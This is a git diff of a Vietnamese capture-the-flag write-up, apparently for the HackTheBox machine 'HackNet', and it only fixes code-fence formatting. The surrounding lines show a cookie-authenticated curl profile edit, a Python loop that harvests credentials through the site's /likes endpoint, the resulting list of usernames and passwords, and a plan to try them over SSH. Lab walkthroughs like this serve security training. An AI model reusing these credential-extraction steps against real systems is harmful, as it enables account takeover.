@@ -53,7 +53,8 @@ curl -s -H "Host: hacknet.htb" -b "$cookie_file" \\\\
   -F "password=" \\\\
   -F "about=" \\\\
   -F "is_public=on" \\\\
-  <http://10.129.232.4/profile/edit> -o /dev/null```
+  <http://10.129.232.4/profile/edit> -o /dev/null
+```
 
 ### Trích xuất credentials qua `/likes`
 
@@ -88,7 +89,8 @@ for pid in range(1, max_posts+1):
 
 print("[+] Tổng số cặp:", len(creds))
 for u,(e,p) in sorted(creds.items()):
-    print(f"{u}:{p} ({e})")```
+    print(f"{u}:{p} ({e})")
+```
 
 ### Kết quả thu được
 
@@ -117,7 +119,8 @@ trojanhorse     : Tr0j@nH0rse!
 virus_viper     : V!rusV!p3r2024
 whitehat        : Wh!t3H@t2024
 zero_day        : Zer0D@yH@ck
-hung            : hung```
+hung            : hung
+```
 
 ### Thử các tài khoản để SSH và tìm user flag
 <img width="554" height="81" alt="image" src="https://github.com/user-attachments/assets/a2f68746-e612-4068-a474-6fc6bd5f177d" />
